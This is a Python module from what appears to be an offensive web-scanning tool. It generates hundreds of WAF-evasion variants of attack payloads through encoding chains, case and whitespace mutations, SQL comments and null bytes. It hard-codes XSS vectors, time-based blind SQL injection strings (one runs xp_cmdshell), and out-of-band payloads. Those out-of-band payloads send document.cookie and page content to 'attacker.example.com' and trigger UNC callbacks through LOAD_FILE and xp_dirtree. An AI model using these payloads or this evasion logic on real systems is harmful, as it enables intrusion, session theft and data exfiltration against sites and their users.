"""
Mega Payload Variant Generator.
Generates hundreds of variants for any given payload using encoding chains,
mutations, WAF bypass techniques, and context-aware transformations.
"""
import re
import random
from typing import List

from .encoding_utils import (
    url_encode, url_encode_double, base64_encode, hex_encode,
    unicode_encode, html_entity_encode,
    null_byte_injection, comment_obfuscation_sql,
    apply_encoding,
)


class PayloadVariantGenerator:
    """
    Generates comprehensive payload variants using all available techniques.
    """

    SQL_COMMENTS = ['/**/', '/*!*/', '--', '#', '-- -', '/*!50000*/', '/*! */']
    WHITESPACE_SUBS = ['\t', '\n', '\r', '\x0c', '\x0b', '%09', '%0a', '%0d']

    XSS_EVENT_HANDLERS = [
        'onload', 'onerror', 'onclick', 'onmouseover', 'onfocus',
        'onblur', 'onkeydown', 'onkeyup', 'onkeypress', 'oninput',
        'onchange', 'onsubmit', 'onreset', 'onselect', 'onabort',
        'ondblclick', 'ondragstart', 'onmousedown', 'onmouseup',
        'onmouseenter', 'onmouseleave', 'onpaste', 'oncut', 'oncopy',
        'oncontextmenu', 'onwheel', 'onscroll', 'ontouchstart',
        'ontouchend', 'ontouchmove', 'onanimationstart', 'onanimationend',
        'ontransitionend', 'onpointerdown', 'onpointerup',
    ]

    def __init__(self, level: str = 'moderate'):
        """
        level: 'minimal', 'moderate', 'aggressive', 'maximum'
        Controls how many variants are generated.
        """
        self.level = level
        self._limits = {
            'minimal': 10,
            'moderate': 50,
            'aggressive': 200,
            'maximum': 1000,
        }
        self.limit = self._limits.get(level, 50)

    def generate_all(self, base_payload: str, vuln_type: str = '') -> List[str]:
        """
        Generate all variants of the payload up to the configured limit.
        Returns list of unique variant strings.
        """
        variants = set()
        variants.add(base_payload)

        generators = [
            self._encoding_variants,
            self._case_mutations,
            self._whitespace_mutations,
            self._comment_injection,
            self._null_byte_variants,
            self._double_encoding_variants,
        ]

        if vuln_type.lower() in ('xss', ''):
            generators.append(self._xss_tag_mutations)
        if vuln_type.lower() in ('sqli', 'sql injection', ''):
            generators.append(self._sql_mutations)

        for gen in generators:
            if len(variants) >= self.limit:
                break
            try:
                new_variants = gen(base_payload)
                for v in new_variants:
                    if len(variants) >= self.limit:
                        break
                    if v and v != base_payload:
                        variants.add(v)
            except Exception:
                continue

        return list(variants)

    def _encoding_variants(self, payload: str) -> List[str]:
        """Apply single encoding techniques."""
        variants = []
        encoding_fns = [
            url_encode, url_encode_double, base64_encode,
            hex_encode, html_entity_encode, unicode_encode,
        ]
        for fn in encoding_fns:
            try:
                v = fn(payload)
                if v:
                    variants.append(v)
            except Exception:
                pass
        return variants

    def _double_encoding_variants(self, payload: str) -> List[str]:
        """Apply double/triple encoding chains."""
        variants = []
        try:
            variants.append(url_encode(url_encode(payload)))
        except Exception:
            pass
        try:
            variants.append(html_entity_encode(url_encode(payload)))
        except Exception:
            pass
        try:
            b64 = base64_encode(payload)
            variants.append(url_encode(b64))
        except Exception:
            pass
        return variants

    def _case_mutations(self, payload: str) -> List[str]:
        """Generate case variations."""
        variants = [payload.upper(), payload.lower()]

        alt = ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
        variants.append(alt)

        alt2 = ''.join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(payload))
        variants.append(alt2)

        rnd = ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
        variants.append(rnd)

        return variants

    def _whitespace_mutations(self, payload: str) -> List[str]:
        """Replace spaces with whitespace alternatives."""
        return [payload.replace(' ', ws) for ws in self.WHITESPACE_SUBS[:4]]

    def _comment_injection(self, payload: str) -> List[str]:
        """Inject comments into payload tokens."""
        variants = [payload.replace(' ', comment) for comment in self.SQL_COMMENTS[:3]]
        variants.append(payload.replace(' ', '<!---->'))
        variants.append(payload.replace(' ', '/**/'))
        return variants

    def _null_byte_variants(self, payload: str) -> List[str]:
        """Add null bytes at strategic positions."""
        variants = []
        try:
            variants.append(null_byte_injection(payload))
        except Exception:
            pass
        variants.extend([
            payload + '%00',
            '%00' + payload,
            payload.replace(' ', '\x00'),
        ])
        return variants

    def _xss_tag_mutations(self, payload: str) -> List[str]:
        """Generate XSS tag variations."""
        variants = []
        if '<script' not in payload.lower():
            return variants

        for tag in ['img', 'svg', 'details', 'video', 'body']:
            for event in self.XSS_EVENT_HANDLERS[:5]:
                if 'alert' in payload:
                    variants.append(f'<{tag} {event}=alert(1)>')

        variants.extend([
            '<svg onload=alert(1)>',
            '<svg/onload=alert(1)>',
            '<details/open/ontoggle=alert(1)>',
            '<a href="javascript:alert(1)">click</a>',
        ])
        return variants

    def _sql_mutations(self, payload: str) -> List[str]:
        """Generate SQL injection mutations."""
        variants = []

        try:
            variants.append(comment_obfuscation_sql(payload))
        except Exception:
            pass

        variants.extend([
            payload.replace("'", "';SELECT SLEEP(5)--"),
            payload + "' AND SLEEP(5)--",
            payload + "' WAITFOR DELAY '0:0:5'--",
        ])
        return variants

    def get_time_based_variants(self, base_payload: str) -> List[str]:
        """Generate time-based (blind) injection variants."""
        return [
            "' OR SLEEP(5)--",
            "'; SELECT SLEEP(5)--",
            "' AND SLEEP(5) AND '1'='1",
            "' WAITFOR DELAY '0:0:5'--",
            "'; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--",
            "' OR 1=1 AND SLEEP(5)--",
            "1; SELECT pg_sleep(5)--",
            "' OR pg_sleep(5)--",
            "1 OR 1=1-- -",
            "' RLIKE SLEEP(5)--",
            '"SLEEP(5)"',
        ]

    def get_oob_variants(self, base_payload: str, callback_url: str = '') -> List[str]:
        """Generate out-of-band detection variants."""
        cb = callback_url or 'http://attacker.example.com'
        return [
            f"' OR 1=1 AND LOAD_FILE('\\\\\\\\{cb}\\\\x')--",
            f"'; EXEC master..xp_dirtree '//{cb}/x'--",
            f"'+UNION+SELECT+LOAD_FILE('\\\\\\\\{cb}\\\\x')--",
            f'<img src=x onerror="fetch(\'{cb}/?c=\'+document.cookie)">',
            f"javascript:fetch('{cb}/?x='+btoa(document.body.innerHTML))",
        ]
